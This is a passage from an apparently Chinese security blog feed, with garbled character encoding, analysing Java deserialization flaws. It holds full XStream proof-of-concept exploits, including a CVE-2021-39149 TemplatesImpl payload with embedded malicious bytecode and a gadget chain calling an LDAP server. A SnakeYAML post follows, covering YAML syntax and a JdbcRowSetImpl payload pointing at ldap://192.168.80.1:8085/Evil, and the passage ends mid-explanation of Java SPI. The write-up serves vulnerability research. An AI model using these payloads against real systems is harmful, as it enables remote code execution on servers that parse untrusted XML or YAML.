&lt;/com.sun.xml.internal.ws.spi.db.FieldSetter&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;/entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;string&gt;value&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;com.sun.xml.internal.ws.spi.db.FieldSetter&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                              &lt;type&gt;[C&lt;/type&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                              &lt;field&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                &lt;name&gt;value&lt;/name&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                &lt;clazz&gt;java.lang.String&lt;/clazz&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                              &lt;/field&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;/com.sun.xml.internal.ws.spi.db.FieldSetter&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;/entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;string&gt;hash&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;com.sun.xml.internal.ws.spi.db.FieldSetter&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                              &lt;type&gt;int&lt;/type&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                              &lt;field reference=&#x27;../../../../../val_-getter/field&#x27;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;/com.sun.xml.internal.ws.spi.db.FieldSetter&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;/entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;/propertySetters&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;propertyGetters&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;string&gt;serialPersistentFields&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;com.sun.xml.internal.ws.spi.db.FieldGetter&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                              &lt;type&gt;[Ljava.io.ObjectStreamField;&lt;/type&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                              &lt;field reference=&#x27;../../../../propertySetters/entry/com.sun.xml.internal.ws.spi.db.FieldSetter/field&#x27;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;/com.sun.xml.internal.ws.spi.db.FieldGetter&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;/entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;string&gt;CASE_INSENSITIVE_ORDER&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;com.sun.xml.internal.ws.spi.db.FieldGetter&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                              &lt;type&gt;java.util.Comparator&lt;/type&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                              &lt;field reference=&#x27;../../../../propertySetters/entry[2]/com.sun.xml.internal.ws.spi.db.FieldSetter/field&#x27;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;/com.sun.xml.internal.ws.spi.db.FieldGetter&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;/entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;string&gt;serialVersionUID&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;com.sun.xml.internal.ws.spi.db.FieldGetter&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                              &lt;type&gt;long&lt;/type&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                              &lt;field reference=&#x27;../../../../propertySetters/entry[3]/com.sun.xml.internal.ws.spi.db.FieldSetter/field&#x27;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;/com.sun.xml.internal.ws.spi.db.FieldGetter&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;/entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;string&gt;value&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;com.sun.xml.internal.ws.spi.db.FieldGetter&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                              &lt;type&gt;[C&lt;/type&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                              &lt;field reference=&#x27;../../../../propertySetters/entry[4]/com.sun.xml.internal.ws.spi.db.FieldSetter/field&#x27;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;/com.sun.xml.internal.ws.spi.db.FieldGetter&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;/entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;string&gt;hash&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;com.sun.xml.internal.ws.spi.db.FieldGetter reference=&#x27;../../../../val_-getter&#x27;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;/entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;/propertyGetters&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;elementLocalNameCollision&gt;false&lt;/elementLocalNameCollision&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;contentClass&gt;java.lang.String&lt;/contentClass&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;elementDeclaredTypes/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;/outer-class&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;/com.sun.xml.internal.ws.spi.db.JAXBWrapperAccessor_-2&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;/accessors&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;wrapper&gt;java.lang.Object&lt;/wrapper&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;bindingContext class=&#x27;com.sun.xml.internal.ws.db.glassfish.JAXBRIContextWrapper&#x27;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;dynamicWrapper&gt;false&lt;/dynamicWrapper&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;/bodyBuilder&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;isOneWay&gt;false&lt;/isOneWay&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;/com.sun.xml.internal.ws.client.sei.StubHandler&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;/entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;/stubHandlers&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;clientConfig&gt;false&lt;/clientConfig&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;/databinding&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;methodHandlers&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;method reference=&#x27;../../../databinding/stubHandlers/entry/method&#x27;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;com.sun.xml.internal.ws.client.sei.SyncMethodHandler&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;owner reference=&#x27;../../../..&#x27;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;method reference=&#x27;../../../../databinding/stubHandlers/entry/method&#x27;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;isVoid&gt;false&lt;/isVoid&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;isOneway&gt;false&lt;/isOneway&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;/com.sun.xml.internal.ws.client.sei.SyncMethodHandler&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;/entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;/methodHandlers&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;/handler&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;/dynamic-proxy&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;string&gt;ldap://172.31.176.1:8085/KjidHtHH&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;/java.util.PriorityQueue&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/java.util.PriorityQueue&gt;&quot;</span>;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        xStream.fromXML(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ä¸å‡ºç½‘CVE-2021-39149"><a href="#ä¸å‡ºç½‘CVE-2021-39149" class="headerlink" title="ä¸å‡ºç½‘CVE-2021-39149"></a>ä¸å‡ºç½‘CVE-2021-39149</h2><p>XStream&lt;&#x3D;1.4.17</p><p>TemplatesImpl</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE_1_4_17_TemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">Evilcls</span> <span class="operator">=</span> readClassStr();</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&lt;linked-hash-set&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;dynamic-proxy&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;interface&gt;map&lt;/interface&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;handler class=&#x27;com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl&#x27;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;classToInvocationHandler class=&#x27;linked-hash-map&#x27;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;defaultHandler class=&#x27;sun.tracing.NullProvider&#x27;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;active&gt;true&lt;/active&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;providerType&gt;java.lang.Object&lt;/providerType&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;probes&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;method&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;class&gt;java.lang.Object&lt;/class&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;name&gt;hashCode&lt;/name&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;parameter-types/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;/method&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;sun.tracing.dtrace.DTraceProbe&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;proxy class=&#x27;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#x27; serialization=&#x27;custom&#x27;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                &lt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                    &lt;default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                        &lt;__name&gt;Pwnr&lt;/__name&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                        &lt;__bytecodes&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                            &lt;byte-array&gt;&quot;</span> +Evilcls+ <span class="string">&quot;&lt;/byte-array&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                            &lt;byte-array&gt;yv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJ&lt;/byte-array&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                        &lt;/__bytecodes&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                        &lt;__transletIndex&gt;-1&lt;/__transletIndex&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                        &lt;__indentNumber&gt;0&lt;/__indentNumber&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                    &lt;/default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                    &lt;boolean&gt;false&lt;/boolean&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                &lt;/com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;/proxy&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;implementing__method&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                &lt;class&gt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/class&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                &lt;name&gt;getOutputProperties&lt;/name&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                &lt;parameter-types/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;/implementing__method&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;/sun.tracing.dtrace.DTraceProbe&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;/entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;/probes&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;/defaultHandler&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;/handler&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;/dynamic-proxy&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/linked-hash-set&gt;&quot;</span>;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        xStream.fromXML(payload);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readClassStr</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;target/classes/TemplatesImpl_RuntimeEvil.class&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> Base64.encode(code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><p><a href="https://fynch3r.github.io/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/">https://fynch3r.github.io/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/</a></p><p><a href="https://xz.aliyun.com/t/10360?time__1311=Cqjx2Qi=0QMDlxGghF2Ph=KGCFC3x">https://xz.aliyun.com/t/10360?time__1311=Cqjx2Qi%3D0QMDlxGghF2Ph%3DKGCFC3x</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> æ¡†æ¶æ¼æ´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XStream </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SnakeYamlååºåˆ—åŒ–åˆ†æ</title>
      <link href="/2024/10/28/snakeyaml/"/>
      <url>/2024/10/28/snakeyaml/</url>
      
        <content type="html"><![CDATA[<p>SnakeYamlæ˜¯javaçš„yamlè§£æç±»åº“ï¼Œæ”¯æŒJavaå¯¹è±¡çš„åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–</p><p>ç±»ä¼¼pythonï¼ŒSnakeYamlä½¿ç”¨ç¼©è¿›ä»£è¡¨å±‚çº§å…³ç³»ï¼Œç¼©è¿›åªèƒ½ç”¨ç©ºæ ¼ï¼Œä¸èƒ½ç”¨TABã€‚</p><p>Copyä¸€æ‰‹Yamlè¯­æ³•ï¼š</p><p>1ã€å¯¹è±¡</p><p>ä½¿ç”¨å†’å·ä»£è¡¨ï¼Œæ ¼å¼ä¸ºkey: valueã€‚å†’å·åé¢è¦åŠ ä¸€ä¸ªç©ºæ ¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key: value</span><br></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨ç¼©è¿›è¡¨ç¤ºå±‚çº§å…³ç³»ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key: </span><br><span class="line">    child-key: value</span><br><span class="line">    child-key2: value2</span><br></pre></td></tr></table></figure><p>2ã€æ•°ç»„</p><p>ä½¿ç”¨ä¸€ä¸ªçŸ­æ¨ªçº¿åŠ ä¸€ä¸ªç©ºæ ¼ä»£è¡¨ä¸€ä¸ªæ•°ç»„é¡¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hobby:</span><br><span class="line">    - Java</span><br><span class="line">    - LOL</span><br></pre></td></tr></table></figure><p>3ã€å¸¸é‡</p><p>YAMLä¸­æä¾›äº†å¤šç§å¸¸é‡ç»“æ„ï¼ŒåŒ…æ‹¬ï¼šæ•´æ•°ï¼Œæµ®ç‚¹æ•°ï¼Œå­—ç¬¦ä¸²ï¼ŒNULLï¼Œæ—¥æœŸï¼Œå¸ƒå°”ï¼Œæ—¶é—´ã€‚ä¸‹é¢ä½¿ç”¨ä¸€ä¸ªä¾‹å­æ¥å¿«é€Ÿäº†è§£å¸¸é‡çš„åŸºæœ¬ä½¿ç”¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">boolean: </span><br><span class="line">    - TRUE  #true,Trueéƒ½å¯ä»¥</span><br><span class="line">    - FALSE  #falseï¼ŒFalseéƒ½å¯ä»¥</span><br><span class="line">float:</span><br><span class="line">    - 3.14</span><br><span class="line">    - 6.8523015e+5  #å¯ä»¥ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•</span><br><span class="line">int:</span><br><span class="line">    - 123</span><br><span class="line">    - 0b1010_0111_0100_1010_1110    #äºŒè¿›åˆ¶è¡¨ç¤º</span><br><span class="line">null:</span><br><span class="line">    nodeName: &#x27;node&#x27;</span><br><span class="line">    parent: ~  #ä½¿ç”¨~è¡¨ç¤ºnull</span><br><span class="line">string:</span><br><span class="line">    - å“ˆå“ˆ</span><br><span class="line">    - &#x27;Hello world&#x27;  #å¯ä»¥ä½¿ç”¨åŒå¼•å·æˆ–è€…å•å¼•å·åŒ…è£¹ç‰¹æ®Šå­—ç¬¦</span><br><span class="line">    - newline</span><br><span class="line">      newline2    #å­—ç¬¦ä¸²å¯ä»¥æ‹†æˆå¤šè¡Œï¼Œæ¯ä¸€è¡Œä¼šè¢«è½¬åŒ–æˆä¸€ä¸ªç©ºæ ¼</span><br><span class="line">date:</span><br><span class="line">    - 2022-07-28    #æ—¥æœŸå¿…é¡»ä½¿ç”¨ISO 8601æ ¼å¼ï¼Œå³yyyy-MM-dd</span><br><span class="line">datetime: </span><br><span class="line">    -  2022-07-28T15:02:31+08:00    #æ—¶é—´ä½¿ç”¨ISO 8601æ ¼å¼ï¼Œæ—¶é—´å’Œæ—¥æœŸä¹‹é—´ä½¿ç”¨Tè¿æ¥ï¼Œæœ€åä½¿ç”¨+ä»£è¡¨æ—¶åŒº</span><br></pre></td></tr></table></figure><h1 id="SnakeYamlååºåˆ—åŒ–"><a href="#SnakeYamlååºåˆ—åŒ–" class="headerlink" title="SnakeYamlååºåˆ—åŒ–"></a>SnakeYamlååºåˆ—åŒ–</h1><p>å…¨ç‰ˆæœ¬å¯åˆ©ç”¨</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.yaml<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>snakeyaml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>SnakeYamlæä¾›äº†Yaml.dump()å’ŒYaml.load()ä¸¤ä¸ªå‡½æ•°å¯¹yamlæ ¼å¼çš„æ•°æ®è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚</p><ul><li>Yaml.load()ï¼šå…¥å‚æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æˆ–è€…ä¸€ä¸ªæ–‡ä»¶ï¼Œç»è¿‡ååºåˆ—åŒ–ä¹‹åè¿”å›ä¸€ä¸ªJavaå¯¹è±¡ï¼›</li><li>Yaml.dump()ï¼šå°†ä¸€ä¸ªå¯¹è±¡è½¬åŒ–ä¸ºyamlæ–‡ä»¶å½¢å¼ï¼›</li></ul><p>å…¶ä¸­åºåˆ—åŒ–å‡ºæ¥çš„å¯¹è±¡æ ¼å¼ä¸º<code>!!Snake.ç±»å</code></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/20220802103026-11a270ac-120b-1.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/20220802103026-11a270ac-120b-1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="20220802103026-11a270ac-120b-1"></p><p>åœ¨ååºåˆ—åŒ–æ—¶å¯ä»¥ç”¨<code>!!</code>æŒ‡å®šååºåˆ—åŒ–çš„ç±»åï¼Œè·Ÿfastjsonä¸€æ ·</p><p>ä¸”æ˜¯è°ƒç”¨setterèµ‹å€¼ï¼Œfastjsonèƒ½ç”¨çš„JdbcRowSetImplè‚¯å®šèƒ½ç”¨</p><h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><p>æ³¨æ„SnakeYamlä¸èƒ½äº’è½¬falseå’Œ0ï¼Œæ‰€ä»¥payloadå¡«false bool</p><p>POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;!!com.sun.rowset.JdbcRowSetImpl\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;&#123;\n&quot;</span>+</span><br><span class="line">            <span class="string">&quot;dataSourceName: ldap://192.168.80.1:8085/Evil,\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;autoCommit: false\n&quot;</span>+</span><br><span class="line">            <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">    yaml.load(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ScriptEngineManager"><a href="#ScriptEngineManager" class="headerlink" title="ScriptEngineManager"></a>ScriptEngineManager</h2><p>è¿™ä¸ªé“¾åˆ©ç”¨äº†SPIæœºåˆ¶</p><h3 id="SPI-æœºåˆ¶"><a href="#SPI-æœºåˆ¶" class="headerlink" title="SPI æœºåˆ¶"></a>SPI æœºåˆ¶</h3><p><code>Java SPI</code>ï¼ˆService Provider Interfaceï¼‰æ˜¯Javaå®˜æ–¹æä¾›çš„ä¸€ç§<code>æœåŠ¡å‘ç°æœºåˆ¶</code>ï¼Œå®ƒå…è®¸åœ¨<code>è¿è¡Œæ—¶åŠ¨æ€åœ°åŠ è½½å®ç°</code>ç‰¹å®šæ¥å£çš„ç±»ï¼Œè€Œä¸éœ€è¦åœ¨ä»£ç ä¸­æ˜¾å¼åœ°æŒ‡å®šè¯¥ç±»</p><p>å½“ä½¿ç”¨ <code>ServiceLoader.load(Class&lt;T&gt; service) </code>æ–¹æ³•åŠ è½½æœåŠ¡æ—¶ï¼Œä¼šæ£€æŸ¥ <code>META-INF/services</code> 